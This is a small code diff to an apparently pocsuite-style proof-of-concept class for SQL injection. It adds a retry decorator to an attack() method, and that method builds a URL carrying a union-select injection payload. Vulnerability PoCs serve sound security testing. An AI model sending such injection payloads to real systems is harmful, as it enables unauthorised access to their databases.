@@ -19,6 +19,7 @@ class SqliPOC(BasePoc):
         self.vulType = 'SQL Injection'
         self.url = url
 
+    @re_try()
     def attack(self):
         vul_url = '%s/?q=node\' and union select * from sec_test ' % self.url
 
